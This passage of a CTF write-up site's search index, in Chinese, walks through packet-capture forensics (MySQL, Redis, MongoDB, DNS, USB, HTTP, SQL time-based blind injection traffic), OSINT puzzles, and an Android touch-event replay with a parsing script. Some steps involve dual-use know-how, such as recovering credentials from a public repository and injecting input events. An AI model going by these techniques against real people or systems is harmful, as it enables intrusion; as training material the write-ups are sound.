(\u7528\u6237\u540d\u3001\u5bc6\u7801\u7b49)     |\n       |-------------------------------------------------&gt;|\n       |                                                  |\n       | 4. \u9a8c\u8bc1\u6210\u529f \u2192 \u53d1\u9001 OK Packet                     |\n       |    \u9a8c\u8bc1\u5931\u8d25 \u2192 \u53d1\u9001 ERR Packet                    |\n       |&lt;-------------------------------------------------|\n       |                                                  |\n       | 5. \u53d1\u9001 SQL \u8bf7\u6c42\uff08COM_QUERY\uff09                    |\n       |-------------------------------------------------&gt;|\n       |                                                  |\n       | 6. \u8fd4\u56de\u7ed3\u679c\uff08OK / ERR / ResultSet\uff09              |\n       |&lt;-------------------------------------------------|\n</code></pre> <p>\u53d1\u73b0\u6709 MySQL \u6d41\u91cf\uff0c\u76f4\u63a5\u8fc7\u6ee4</p> <p></p> <p>\u6309\u7167\u987a\u5e8f\u524d\u4e09\u4e2a\u4e3a\u4e00\u7ec4\u53ef\u4ee5\u53d1\u73b0\u5728\u7b2c\u4e09\u6b21\u65f6\u767b\u5f55\u6210\u529f</p> <p></p> <p>\u5728\u540e\u7eed\u7684 Request \u5305\u4e2d\u53ef\u4ee5\u770b\u5230\u67e5\u8be2\u8bed\u53e5</p> <p></p> <p><code>row packet</code> \u91cc\u90fd\u662f\u8fd4\u56de\u7ed3\u679c</p> <p></p> <p>\u5728\u54cd\u5e94\u5305\u4e2d\u53ef\u4ee5\u627e\u5230 flag</p> <p></p>"},{"location":"Misc/Chapter5/5-32/","title":"Redis \u6d41\u91cf\u9690\u5199","text":""},{"location":"Misc/Chapter5/5-32/#redis-\u6d41\u91cf\u9690\u5199","title":"Redis \u6d41\u91cf\u9690\u5199","text":"<p>Redis \u534f\u8bae\u6d41\u7a0b\u56fe\u5982\u4e0b</p> <pre><code>[\u5ba2\u6237\u7aef]\n    |\n    |  \u53d1\u9001\u547d\u4ee4\uff08RESP \u534f\u8bae\u683c\u5f0f\uff09\n    v\n  +------------------------------------+\n  | *3                                |\n  | $3                                |\n  | SET                               |\n  | $4                                |\n  | key1                              |\n  | $6                                |\n  | value1                            |\n  +------------------------------------+\n    |\n    |  \u7b49\u5f85\u54cd\u5e94\n    v\n[Redis \u670d\u52a1\u5668]\n    |\n    |  \u89e3\u6790\u547d\u4ee4\u5e76\u6267\u884c\n    v\n  +--------------+\n  | +OK\\r\\n      |  \u2190 \u7b80\u5355\u5b57\u7b26\u4e32\u54cd\u5e94\n  +--------------+\n    |\n    v\n[\u5ba2\u6237\u7aef\u63a5\u6536\u54cd\u5e94]\n</code></pre> <p>\u76f4\u63a5\u8fc7\u6ee4 RESP \u534f\u8bae</p> <p></p> <p>\u9996\u5148\u6765\u770b\u7b2c\u4e00\u4e2a\u5305</p> <pre><code>6   12.525675   30.0.250.11 30.0.30.10  RESP    83  Request: COMMAND\n</code></pre> <p><code>COMMAND</code> \u662f Redis \u7684**\u5143\u547d\u4ee4**\uff0c\u7528\u4e8e\u83b7\u53d6\u670d\u52a1\u5668\u652f\u6301\u7684\u6240\u6709\u547d\u4ee4\u53ca\u5176\u8be6\u7ec6\u63cf\u8ff0</p> <p>\u6240\u4ee5\u540e\u7eed\u8fd9\u4e9b\u54cd\u5e94\u90fd\u662f <code>COMMAND</code> \u7684\u7ed3\u679c</p> <p></p> <p>\u8fd9\u91cc\u53ef\u4ee5\u76f4\u63a5\u770b\u5230\u8bbe\u7f6e\u7684 flagflag</p> <p></p>"},{"location":"Misc/Chapter5/5-33/","title":"MongoDB \u6d41\u91cf\u9690\u5199","text":""},{"location":"Misc/Chapter5/5-33/#mongodb-\u6d41\u91cf\u9690\u5199","title":"MongoDB \u6d41\u91cf\u9690\u5199","text":"<p>MongoDB \u534f\u8bae\u6d41\u7a0b\u56fe\u5982\u4e0b</p> <pre><code>+-----------------+       +------------------+\n|  Client         |       |  MongoDB Server  |\n+-----------------+       +------------------+\n| OP_MSG (find)   |  --&gt;  |                  |\n|                 |       | \u6267\u884c\u67e5\u8be2         |\n|                 |  &lt;--  | OP_MSG (\u7ed3\u679c\u6587\u6863)|\n+-----------------+       +------------------+\n</code></pre> <p>\u76f4\u63a5\u8fc7\u6ee4 Mongo \u534f\u8bae</p> <p></p> <p>\u7ec6\u770b\u6d41\u91cf\u5305</p> <p></p> \u5b57\u6bb5\u540d \u503c \u542b\u4e49\u8bf4\u660e <code>fullCollectionName</code> <code>admin.$cmd</code> \u8868\u793a\u8981\u64cd\u4f5c\u7684\u5b8c\u6574\u96c6\u5408\u540d\uff08\u6570\u636e\u5e93\u540d + \u96c6\u5408\u540d\uff09 <p><code>$cmd</code> \u662f MongoDB \u7684\u5185\u90e8\u865a\u62df\u96c6\u5408\u540d\uff0c\u4ee3\u8868\u201c\u6211\u8981\u53d1\u9001\u4e00\u4e2a\u6570\u636e\u5e93\u547d\u4ee4\u201d\uff0c\u800c\u4e0d\u662f\u5e38\u89c4\u7684 CRUD\uff08\u589e\u5220\u6539\u67e5\uff09\u64cd\u4f5c</p> <p></p> \u5b57\u6bb5 \u610f\u56fe <code>ismaster</code> \u8bf7\u6c42\u670d\u52a1\u5668\u8fd4\u56de\u81ea\u8eab\u72b6\u6001\uff08\u5df2\u88ab <code>hello</code> \u53d6\u4ee3\uff09 <code>client</code> \u63d0\u4f9b\u5ba2\u6237\u7aef\u7cfb\u7edf\u548c\u9a71\u52a8\u4fe1\u606f\uff08\u8bca\u65ad\u7528\u9014\uff09 <code>compression</code> \u63d0\u51fa\u652f\u6301\u7684\u538b\u7f29\u534f\u8bae\uff08\u4f18\u5316\u7f51\u7edc\u4f20\u8f93\uff09 <p>\u518d\u6765\u770b\u5bf9\u5e94\u7684\u54cd\u5e94\u5305</p> <p></p> <p>\u54cd\u5e94\u5185\u5bb9\u5927\u81f4\u5982\u4e0b</p> <pre><code>{\n  \"ismaster\": true,\n  \"maxBsonObjectSize\": 16777216,\n  \"maxMessageSizeBytes\": 48000000,\n  \"maxWriteBatchSize\": 100000,\n  \"localTime\": \"2025-07-24T12:34:56.123Z\",\n  \"logicalSessionTimeoutMinutes\": 30,\n  \"minWireVersion\": 0,\n  \"maxWireVersion\": 13,\n  \"readOnly\": false,\n  \"ok\": 1\n}\n</code></pre> \u5b57\u6bb5\u540d \u7c7b\u578b \u8bf4\u660e <code>ismaster</code> / <code>hello</code> \u5e03\u5c14\u503c \u8868\u793a\u670d\u52a1\u5668\u662f\u4e3b\u8282\u70b9\uff08primary\uff09 <code>maxBsonObjectSize</code> \u6574\u6570 \u5355\u4e2a BSON \u6587\u6863\u7684\u6700\u5927\u5b57\u8282\u6570\uff08\u9ed8\u8ba4 16MB\uff09 <code>maxMessageSizeBytes</code> \u6574\u6570 \u6700\u5927\u6d88\u606f\u5305\u5927\u5c0f\uff08\u9ed8\u8ba4\u7ea6 48MB\uff09 <code>maxWriteBatchSize</code> \u6574\u6570 \u6279\u91cf\u5199\u5165\u7684\u6700\u5927\u6587\u6863\u6570\uff08\u9ed8\u8ba4 100,000\uff09 <code>localTime</code> \u65e5\u671f\u65f6\u95f4 \u670d\u52a1\u5668\u7684\u672c\u5730\u65f6\u95f4\uff08ISO8601 \u683c\u5f0f\uff09 <code>logicalSessionTimeoutMinutes</code> \u6574\u6570 \u903b\u8f91\u4f1a\u8bdd\u8d85\u65f6\u65f6\u95f4\uff0c\u5355\u4f4d\u5206\u949f <code>minWireVersion</code> \u6574\u6570 \u652f\u6301\u7684\u534f\u8bae\u7248\u672c\u8303\u56f4\u4e0b\u9650 <code>maxWireVersion</code> \u6574\u6570 \u652f\u6301\u7684\u534f\u8bae\u7248\u672c\u8303\u56f4\u4e0a\u9650\uff0813 \u5bf9\u5e94 MongoDB 7.x\uff09 <code>readOnly</code> \u5e03\u5c14\u503c \u662f\u5426\u4e3a\u53ea\u8bfb\u5b9e\u4f8b\uff08\u5982\u53ea\u8bfb\u526f\u672c\u6216\u76d1\u63a7\u8282\u70b9\uff09 <code>ok</code> \u6570\u503c \u662f\u5426\u6210\u529f\u6267\u884c\u8be5\u547d\u4ee4\uff081 = \u6210\u529f\uff09 <p>\u5176\u5177\u4f53\u7684\u503c\u5728 Value \u4e2d\u67e5\u770b</p> <p></p>"},{"location":"Misc/Chapter5/5-4/","title":"USB \u6d41\u91cf\u9690\u5199","text":""},{"location":"Misc/Chapter5/5-4/#usb-\u6d41\u91cf\u9690\u5199","title":"USB \u6d41\u91cf\u9690\u5199","text":"<p>\u4e3b\u8981\u89c2\u5bdf\u6570\u636e\u5305\u957f\u5ea6\uff0c\u6709\u56fe\u7247\u7684\u5f80\u5f80\u957f\u5ea6\u5f88\u5927\uff0c\u590d\u5236\u5176\u5341\u516d\u8fdb\u5236\u5199\u5165\u65b0\u6587\u4ef6\u4e2d </p> <p>\u6570\u636e\u5305\u6309\u957f\u5ea6\u6392\u5e8f\u53d1\u73b0\u4e24\u4e2a\u6570\u636e\u5305\u5f02\u5e38</p> <p></p> <p>\u6253\u5f00\u5176\u4e2d\u4e00\u4e2a\u770b\u5230\u4e86 PNG \u5934\u6587\u4ef6</p> <p></p> <p>\u590d\u5236\u5176\u503c\u5341\u516d\u8fdb\u5236</p> <p></p> <p>\u5728 WinHex \u4e2d\u5199\u5165\u65b0\u6587\u4ef6\u4fdd\u5b58\u4e3a PNG</p> <p></p> <p>\u6210\u529f\u6253\u5f00</p> <p></p>"},{"location":"Misc/Chapter5/5-5/","title":"DNS \u8bf7\u6c42\u57df\u540d\u9690\u5199","text":""},{"location":"Misc/Chapter5/5-5/#dns-\u8bf7\u6c42\u57df\u540d\u9690\u5199","title":"DNS \u8bf7\u6c42\u57df\u540d\u9690\u5199","text":"<p>DNS \u8bf7\u6c42\u9898\u4e00\u822c\u770b\u8bf7\u6c42\u57df\u540d\u5c31\u884c </p> <p>\u6253\u5f00\u6d41\u91cf\u5305\u5148\u8fc7\u6ee4 DNS</p> <p>\u56e0\u4e3a\u53ea\u6709\u4e24\u4e2a IP\uff0c\u6240\u4ee5\u76f4\u63a5\u6309\u6e90\u5730\u5740\u6392\u5e8f</p> <p>\u770b\u5230\u8bf7\u6c42\u57df\u540d\u662f Zip \u7684\u6587\u4ef6\u5934</p> <p></p> <p>\u4f7f\u7528 Tshark \u811a\u672c\u63d0\u53d6\u51fa\u6765</p> <pre><code>tshark -r capture.pacpng -T fields -Y ip.src=192.168.43.1 -e dns.qry.name\n</code></pre> <p></p> <p>\u8fd8\u8981\u5728\u8fc7\u6ee4\u4e0b\u6570\u636e\uff0c\u4f7f\u7528 awk \u8fc7\u6ee4</p> <pre><code>awk \u5185\u7f6e\u51fd\u6570 match\uff1a\u641c\u7d22\u7b2c\u4e00\u4e2a\u53c2\u6570\u627e\u5230\u4e0e\u7b2c\u4e8c\u4e2a\u53c2\u6570\u5339\u914d\u7684\u5b57\u7b26\u4e32\u5b58\u5728\u7b2c\u4e09\u4e2a\u53c2\u6570\u4e2d\n\n$0 \u4ee3\u8868\u5f53\u524d\u884c\n\n. \uff1a\u5339\u914d\u5355\u4e2a\u4efb\u610f\u5b57\u7b26\n\n\uff1a\u51fa\u73b0\u96f6\u6b21\u6216\u591a\u6b21\n\n\\ \uff1a\u8f6c\u4e49\n</code></pre> <p></p> <p>\u5728 WinHex \u4e2d\u521b\u5efa\u65b0\u6587\u4ef6\u5199\u5165</p> <p></p> <p>\u6253\u5f00\u62ff\u5230 flag</p> <p></p>"},{"location":"Misc/Chapter5/5-6/","title":"UDP \u6d41\u91cf\u9690\u5199","text":""},{"location":"Misc/Chapter5/5-6/#udp-\u6d41\u91cf\u9690\u5199","title":"UDP \u6d41\u91cf\u9690\u5199","text":"<p>\u6253\u5f00\u53ea\u6709\u4e09\u79cd\u534f\u8bae\uff1aTLS\u3001TCP\u3001UDP</p> <p></p> <p>TLS \u9700\u8981\u5bc6\u94a5\u624d\u80fd\u89e3\u51fa\uff0cTCP \u4e00\u822c\u6ca1\u4e1c\u897f\uff0c\u6240\u4ee5\u6211\u4eec\u5148\u770b UDP</p> <p></p> <p>\u7b2c\u4e00\u4e2a\u6570\u636e\u5305\u53f3\u952e\u8ffd\u8e2a\u6570\u636e\u6d41\u62ff\u5230 flag</p> <p></p>"},{"location":"Misc/Chapter5/5-7/","title":"FTP-DATA \u9690\u5199","text":""},{"location":"Misc/Chapter5/5-7/#ftp-data-\u9690\u5199","title":"FTP-DATA \u9690\u5199","text":"<p>\u6253\u5f00\u6709 FTP-DATA\uff0c\u4f18\u5148\u770b FTP-DATA</p> <p></p> <p>\u8ffd\u8e2a\u6d41\u63d0\u53d6\u8f6c\u5b58\u56fe\u7247\uff08\u539f\u59cb\u6570\u636e\uff09</p> <p></p> <p>\u6210\u529f\u62ff\u5230\u56fe\u7247</p> <p></p>"},{"location":"Misc/Chapter5/5-8/","title":"HTTP \u6d41\u91cf\u9690\u5199","text":""},{"location":"Misc/Chapter5/5-8/#http-\u6d41\u91cf\u9690\u5199","title":"HTTP \u6d41\u91cf\u9690\u5199","text":"<p>\u6253\u5f00\u53d1\u73b0\u6709 HTTP \u76f4\u63a5\u8fc7\u6ee4</p> <p></p> <p>\u7b2c\u4e00\u4e2a\u662f ZIP \u6587\u4ef6\uff0c\u5c1d\u8bd5\u8ffd\u8e2a\u6d41\u62ff\u5230 flag</p> <p></p>"},{"location":"Misc/Chapter5/5-9/","title":"SQL \u65f6\u95f4\u76f2\u6ce8\u9690\u5199","text":""},{"location":"Misc/Chapter5/5-9/#sql-\u65f6\u95f4\u76f2\u6ce8\u9690\u5199","title":"SQL \u65f6\u95f4\u76f2\u6ce8\u9690\u5199","text":"<p>SQL \u65f6\u95f4\u76f2\u6ce8\u539f\u7406\uff1a</p> <p>\u9ed1\u5ba2\u6784\u9020\u4e00\u4e2a\u4f7f\u7528\u5ef6\u65f6\u51fd\u6570\u7684 SQL \u67e5\u8be2\uff0c\u5ef6\u65f6\u51fd\u6570\u7684\u89e6\u53d1\u6761\u4ef6\u4e0e\u6570\u636e\u5e93\u4e2d\u7684\u6570\u636e\u8fdb\u884c\u6bd4\u8f83</p> <p>\u5982\u679c\u6bd4\u8f83\u4e3a\u771f\uff0c\u5ef6\u65f6\u51fd\u6570\u6267\u884c\uff0c\u67e5\u8be2\u6267\u884c\u65f6\u95f4\u53d8\u957f</p> <p>\u5982\u679c\u6bd4\u8f83\u4e3a\u5047\uff0c\u5ef6\u65f6\u51fd\u6570\u4e0d\u6267\u884c\uff0c\u67e5\u8be2\u6267\u884c\u65f6\u95f4\u8f83\u77ed</p> <p>\u8bdd\u4e0d\u591a\u8bf4\uff0c\u76f4\u63a5\u4e0a\u9898\uff08BugKu CTF\uff09</p> <p></p> <p>\u6253\u5f00\u6d41\u91cf\u5305\u6709 HTTP \u5219\u5148\u8fc7\u6ee4 HTTP</p> <p></p> <p>\u968f\u673a\u590d\u5236\u4e00\u4e2a\u8bf7\u6c42 URL \u53bb URL \u89e3\u7801</p> <p></p> <p>\u77e5\u9053\u4e86\u5ef6\u65f6\u662f 1s\uff0c\u6211\u4eec\u5c31\u8981\u8fc7\u6ee4\u51fa\u5927\u4e8e 1s \u7684\u8bf7\u6c42</p> <pre><code>tshark -r 40\u2026\u2026.pacpng -Tfields -e http.resopnse_for.uri -Y 'http.response and http.time &gt; 1' &gt; queries.txt\n</code></pre> <p></p> <p>\u5c06\u8bf7\u6c42\u5168\u90e8 URL \u89e3\u7801\uff0c\u7136\u540e\u5c06\u56fe\u4e2d\u6bd4\u8f83\u7684\u5341\u8fdb\u5236\u6570\u8f6c ASCII \u62fc\u63a5\u5c31\u662f flag</p> <p></p>"},{"location":"Misc/Chapter6/","title":"Index","text":""},{"location":"Misc/Chapter6/#darkside","title":"DarkSide","text":"<p>DarkSide \u662f\u4e00\u4e2a\u9ed1\u5ba2\u7ec4\u7ec7\uff0c\u66fe\u5229\u7528\u52d2\u7d22\u8f6f\u4ef6\u6765\u653b\u51fb\u53d7\u5bb3\u8005</p> <p>DarkSide \u7684\u603b\u90e8\u4f4d\u4e8e\u4e1c\u6b27\uff0c\u4f46\u4e0e\u5176\u4ed6\u9ed1\u5ba2\u7ec4\u7ec7\u4e0d\u540c\u7684\u662f\uff0c\u5b83\u5e76\u4e0d\u662f\u7531\u56fd\u5bb6\u652f\u6301\u7684\u9ed1\u5ba2\u7ec4\u7ec7</p> <p>DarkSide \u57fa\u672c\u53ea\u9488\u5bf9\u82f1\u8bed\u56fd\u5bb6\u53d1\u52a8\u7f51\u7edc\u88ad\u51fb</p> <p>DarkSide \u7684\u52d2\u7d22\u8f6f\u4ef6\u5c06\u9ed8\u8ba4\u8bed\u8a00\u8bbe\u7f6e\u4e3a\u4fc4\u8bed\u3001\u4e4c\u514b\u5170\u8bed\u3001\u683c\u9c81\u5409\u4e9a\u8bed\u6216\u767d\u4fc4\u7f57\u65af\u8bed\u7684\u8ba1\u7b97\u673a\u5217\u4e3a\u767d\u540d\u5355\uff0c\u8fd9\u4e9b\u7535\u8111\u4e0d\u4f1a\u88ab\u8be5\u9ed1\u5ba2\u7ec4\u7ec7\u7684\u52d2\u7d22\u8f6f\u4ef6\u653b\u51fb</p> <p>\u5728 DarkSide \u7f51\u7ad9\u7684\u4e00\u4efd\u65b0\u95fb\u7a3f\u4e2d\uff0c\u8be5\u7ec4\u7ec7\u58f0\u79f0\u4ed6\u4eec\u4e0d\u4f1a\u653b\u51fb\u533b\u9662\u3001\u5b89\u5b81\u533b\u9662\u3001\u5b66\u6821\u3001\u5927\u5b66\u3001\u975e\u8425\u5229\u7ec4\u7ec7\u6216\u653f\u5e9c\u90e8\u95e8\u3002\u8be5\u7ec4\u7ec7\u8981\u6c42\u7684\u8d4e\u91d1\u4e00\u822c\u5728 20 \u4e07\u7f8e\u5143\u81f3 200 \u4e07\u7f8e\u5143\u8303\u56f4\u4e4b\u5185\u3002DarkSide \u8fd8\u58f0\u79f0\u4ed6\u4eec\u4f1a\u5c06\u90e8\u5206\u8d4e\u91d1\u6350\u8d60\u7ed9\u6148\u5584\u673a\u6784</p> <p>2020\u5e748\u6708\uff0c\u4eba\u4eec\u9996\u6b21\u6ce8\u610f\u5230\u8be5\u9ed1\u5ba2\u7ec4\u7ec7</p> <p></p>"},{"location":"Misc/Chapter6/6-1/","title":"\u56fe\u7247\u65e5\u671f","text":""},{"location":"Misc/Chapter6/6-1/#\u56fe\u7247\u65e5\u671f","title":"\u56fe\u7247\u65e5\u671f","text":"<p>\u610f\u601d\u8ba9\u6211\u4eec\u627e\u51fa\u56fe\u7247\u7684\u65e5\u671f\uff0c\u76f4\u63a5\u67e5\u770b\u5c5e\u6027\u5373\u53ef</p> <p></p>"},{"location":"Misc/Chapter6/6-2/","title":"\u7535\u5b50\u90ae\u4ef6\u57df\u540d","text":""},{"location":"Misc/Chapter6/6-2/#\u7535\u5b50\u90ae\u4ef6\u57df\u540d","title":"\u7535\u5b50\u90ae\u4ef6\u57df\u540d","text":"<p>\u6253\u5f00\u90ae\u4ef6</p> <p></p> <p>\u53bb\u7f51\u7ad9\u67e5\u8be2\u8fd9\u4e2a\u57df\u540d\u7684 DNS \u89e3\u6790</p> <p></p> <p>\u518d\u67e5\u627e\u5b50\u57df\u540d\u5f97\u5230 flag</p> <p></p>"},{"location":"Misc/Chapter6/6-3/","title":"\u793e\u4ea4\u5934\u50cf","text":""},{"location":"Misc/Chapter6/6-3/#\u793e\u4ea4\u5934\u50cf","title":"\u793e\u4ea4\u5934\u50cf","text":"<p>\u53bb\u7f51\u7ad9\u4e0a\u641c\u7d22\u8fd9\u4e2a\u7528\u6237\uff08\u53ef\u80fd\u88ab\u5899\uff09</p> <p></p> <p>\u5934\u50cf\u98ce\u683c\u662f Github \u7684\uff0c\u53bb Github \u4e0a\u641c\u7d22</p> <p></p> <p>\u6709\u4e2a\u767b\u5f55\u7684\u9879\u76ee\uff0c\u8fdb\u53bb\u770b\u770b</p> <p></p> <p>\u627e\u5230\u4e86\u767b\u5f55\u7684\u7528\u6237\u540d\u53ca\u5bc6\u7801\uff08\u539f\u6765\u662f\u6709\u5bc6\u7801\u7684\uff0c\u4e0d\u77e5\u9053\u4e3a\u4ec0\u4e48\u5199\u535a\u5ba2\u7684\u65f6\u5019\u53d1\u73b0\u88ab\u5220\u4e86\uff09</p> <p></p>"},{"location":"Misc/Chapter6/6-4/","title":"\u7535\u5b50\u90ae\u4ef6\u65e5\u5386\u6587\u4ef6","text":""},{"location":"Misc/Chapter6/6-4/#\u7535\u5b50\u90ae\u4ef6\u65e5\u5386\u6587\u4ef6","title":"\u7535\u5b50\u90ae\u4ef6\u65e5\u5386\u6587\u4ef6","text":"<p>\u6253\u5f00\u90ae\u4ef6\u4e0b\u8f7d\u8fd9\u4e2a\u65e5\u5386\u6587\u4ef6</p> <p></p> <p>\u5728\u65e5\u5386\u6587\u4ef6\u4e2d\u7ffb\u627e\u7684\u4e00\u4e2a\u7f51\u5740\uff0c\u53bb\u8fd9\u4e2a\u7f51\u5740\u4e0b\u8f7d\u4e00\u4e2a\u56fe\u7247\uff08\u5176\u5b9e\u662f VBS \u7a0b\u5e8f\uff09\uff0c\u6700\u540e\u8fdb\u884c\u53cd\u7f16\u8bd1\u9006\u5411\u5373\u53ef</p> <p></p>"},{"location":"Misc/Chapter6/6-5/","title":"\u57fa\u7ad9\u5b9a\u4f4d","text":""},{"location":"Misc/Chapter6/6-5/#\u57fa\u7ad9\u5b9a\u4f4d","title":"\u57fa\u7ad9\u5b9a\u4f4d","text":"<p>\u5148\u8981\u5c06\u6570\u636e\u5f02\u6216</p> <p></p> <p>\u5f97\u5230\u4e00\u5f20\u57fa\u7ad9\u6570\u636e\u56fe\u7247</p> <p></p> <p>\u7f51\u4e0a\u67e5\u8be2\u5730\u5740\u5c31\u662f flag</p> <p></p>"},{"location":"Misc/Chapter6/6-6/","title":"\u6c7d\u8f66\u9ed1\u5323\u5b50\u5b9a\u4f4d","text":""},{"location":"Misc/Chapter6/6-6/#\u6c7d\u8f66\u9ed1\u5323\u5b50\u5b9a\u4f4d","title":"\u6c7d\u8f66\u9ed1\u5323\u5b50\u5b9a\u4f4d","text":"<p>\u4e0b\u8f7d\u6587\u4ef6\u540e gunzip \u89e3\u538b\u7f29</p> <p></p> <p>\u8bc6\u522b\u6587\u4ef6\u4e3a ASF \u6587\u4ef6\uff0c\u76f4\u63a5\u6253\u5f00\u6587\u4ef6\uff0c\u53f3\u4e0b\u89d2 KOR \u4ee3\u8868\u5357\u97e9\uff08\u600e\u4e48\u4e5f\u4e0d\u53ef\u80fd\u662f\u5317\u97e9\u5427\uff09</p> <p></p> <p>\u9898\u76ee\u95ee\u6700\u7ec8\u76ee\u7684\u5730\u53d1\u751f\u4e86\u8f66\u7978\uff0c\u8fd9\u4e2a\u5730\u70b9\u5728\u54ea</p> <p>\u4f46\u662f\u89c6\u9891\u592a\u7cca\u4e86\uff0c\u5565\u90fd\u770b\u4e0d\u6e05\u5988\u7684</p> <p>\u53ea\u80fd\u9760\u8fd9\u4e2a\u9ed1\u5323\u5b50\u6587\u4ef6\u4e2d\u8bb0\u5f55\u7684\u4e0d\u4ec5\u6709\u89c6\u9891\uff0c\u8fd8\u6709\u5b9a\u4f4d</p> <p>\u8fc7\u6ee4\u5b57\u7b26\u4e32\u5230 txt \u6587\u672c\u4e2d</p> <p></p> <p>\u4f7f\u7528 VS Code \u6253\u5f00\u901a\u914d\u7b26\u8fc7\u6ee4\uff0c\u5177\u4f53\u591a\u5c11 \\d \u5f97\u4f60\u81ea\u5df1</p> <p>\u56e0\u4e3a\u4e24\u4e09\u4e2a\u4ee5\u4e0b\u4f1a\u6709\u5176\u4ed6\u5783\u573e\u6570\u636e\uff0c\u6240\u4ee5\u591a\u4e00\u70b9\u4f1a\u66f4\u597d</p> <p></p> <p>\u53d1\u73b0\u7591\u4f3c\u5750\u6807\u7684\u6570\u636e</p> <p></p> <p>37 126 \u5e94\u8be5\u662f\u5317\u7eac\u5ea6\uff0c\u6700\u7ec8\u76ee\u7684\u5730\u5c31\u662f\u6700\u540e\u4e00\u4e2a\u5750\u6807</p> <p>\u53bb\u8c37\u6b4c\u5730\u56fe\u641c\u7d22\uff0c\u8fd9\u91cc\u6211\u590d\u73b0\u6ca1\u641c\u51fa\u6765</p> <p></p> <p>The flag: San 15-3 Seongbuk-dong, Seongbuk-gu, Seoul</p>"},{"location":"Misc/Chapter6/6-7/","title":"\u5b89\u5353\u6a21\u62df\u89e6\u5c4f","text":""},{"location":"Misc/Chapter6/6-7/#\u5b89\u5353\u6a21\u62df\u89e6\u5c4f","title":"\u5b89\u5353\u6a21\u62df\u89e6\u5c4f","text":"<p>WinHex \u770b\u4e00\u4e0b\u6587\u4ef6\u5934\u4e3a\u5c0f\u7c73\u5907\u4efd\u6587\u4ef6\uff0c\u53ef\u4ee5\u7528 7zip \u6253\u5f00\u5f97\u5230 base.apk</p> <p></p> <p>\u653e\u5165 jadx \u4e2d\u53cd\u7f16\u8bd1</p> <p></p> <p>hook \u4e4b\u540e\u662f\u76f4\u63a5\u663e\u793a\u901a\u8fc7\uff0c\u5e76\u6ca1\u6709\u7ed9\u51fa flag</p> <p></p> <p>\u4e4b\u540e\u5728so\u4e2d\u53d1\u73b0\u8bfb\u53d6<code>/dev/input/event1</code>\u5e76\u4fdd\u5b58\u5728\u5e94\u7528\u76ee\u5f55\u4e0b</p> <p></p> <p>\u5907\u4efd\u6587\u4ef6\u4e2d\u7684\u6570\u636e\u6587\u4ef6\u5c31\u662f\u4fdd\u5b58\u4e0b\u6765\u7684\u8f93\u5165\u6570\u636e</p> <p></p> <p>\u5229\u7528\u547d\u4ee4\u5373\u53ef\u6a21\u62df\u8f93\u5165</p> <p></p> <p>\u4e00\u6b21\u8f93\u5165\u952e\u76d8\u5361\u4f4f\uff0c\u6ca1\u6709\u5168\u90e8\u8f93\u5165\u5b8c\u6210</p> <p></p> <p>\u8f6c\u6362\u601d\u8def\uff0c\u901a\u8fc7\u9605\u8bfb\u6587\u7ae0\uff0c\u53d1\u73b0\u53ef\u4ee5\u5206\u6790\u6587\u4ef6\u6307\u4ee4</p> <p>\u5148\u901a\u8fc7\u547d\u4ee4 <code>getevent -lt /dev/input/event1</code> \u548c\u547d\u4ee4 <code>cat 1666666666 &gt;&gt; /dev/input/event1</code> \u53ef\u4ee5\u6293\u53d6\u6587\u4ef6\u672a\u62a5\u9519\u90e8\u5206\u7684\u4fe1\u606f</p> <pre><code>getevent \u7528\u4e8e\u4ece Linux \u8f93\u5165\u5b50\u7cfb\u7edf\uff08/dev/input/\uff09\u8bfb\u53d6\u539f\u59cb\u8f93\u5165\u4e8b\u4ef6\n</code></pre> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u4e0a\u56fe\u4e2d\u6309\u4e0b\u7684\u5750\u6807\u503c\uff0c\u6839\u636e\u5750\u6807\u503c\u641c\u7d22\u6587\u4ef6\u768416\u8fdb\u5236\u6570\u636e\uff0c\u53ef\u4ee5\u53d1\u73b0\u4e24\u4e2a\u6307\u4ee4</p> <p>\u6307\u4ee4 <code>03003500</code> \u4ee3\u8868<code>X\u8f74</code>\uff0c\u6307\u4ee4 <code>03003600</code> \u4ee3\u8868<code>Y\u8f74</code></p> <p></p> <p>\u4f9d\u6b21\u5199\u51fa\u811a\u672c\u63d0\u53d6\u6240\u6709\u7684\u5750\u6807</p> <pre><code>def get_x(v):\n    x = []\n    for i in range(4):\n        tmp = str(hex(v[i+4]))[2:]\n        if len(tmp) == 1:\n            tmp = \"0\" + tmp\n        x.append(tmp)\n    x.reverse()\n    ret = \"\"\n    for v in x:\n        ret += v\n    return int(ret,16)\n\ndef get_y(v):\n    y = []\n    for i in range(4):\n        tmp = str(hex(v[i+4]))[2:]\n        if len(tmp) == 1:\n            tmp = \"0\" + tmp\n        y.append(tmp)\n    y.reverse()\n    ret = \"\"\n    for v in y:\n        ret += v\n    return int(ret,16)\n\ndef is_y(v):\n    if v[0] == 0x03 and v[1] == 0x00 and v[2] == 0x36 and v[3] == 0x00:\n        return True\n    return False\n\ndef is_x(v):\n    if v[0] == 0x03 and v[1] == 0x00 and v[2] == 0x35 and v[3] == 0x00:\n        return True\n    return False\n\nwith open(\"1666666666\",\"rb\") as fr:\n    rd = fr.read()\nfor i in range(16,len(rd),24):\n    v = rd[i:i+8]\n    x = 0\n    y = 0\n    if is_x(v):\n        x = get_x(v)\n        print(x,end=\",\")\n    if is_y(v):\n        y = get_y(v)\n        print(y)\n# 622,319\n# 83,1901\n# 472,1904\n# 81,1892\n# 133,1739\n# 493,1603\n# 62,1892\n# 443,502,1601\n# 450,1755\n# 97,1903\n# 107,2064\n# 293,1622\n# 487,1620\n# 635,1751\n# 271,1601\n# 83,2086\n# 1011,1626\n# 65,1919\n# 453,1913\n# 386,1438\n# 500,1588\n# 84,2021\n# 1015,1630\n# 87,2074\n# 465,1902\n# 489,1446\n# 90,2042\n# 1028,1611\n# 77,1897\n# 417,1599\n# 77,1903\n# 286,1613\n# 438,1912\n# 1032,1491\n# 388,1615\n# 325,1758\n# 804,1623\n# 82,1895\n# 765,1908\n# 920,1464\n# 76,2056\n# 1016,1635\n# 89,2060\n# 769,1763\n# 431,1912\n# 385,1614\n# 290,1435\n# 1437\n# 756,1933\n# 95,2051\n# 1021,1647\n# 648,1906\n# 593,1597\n# 86,2069\n# 1029,1649\n# 817,1615\n# 767,1899\n# 83,1919\n# 1043,1643\n# 79,1909\n# 715,1611\n# 492,1625\n# 89,2090\n# 1040,1632\n# 289,1607\n# 542,1918\n# 81,1935\n# 292,1580\n# 80,1909\n# 756,1922\n# 711,1466\n# 83,2021\n# 392,1605\n# 587,781\n</code></pre> 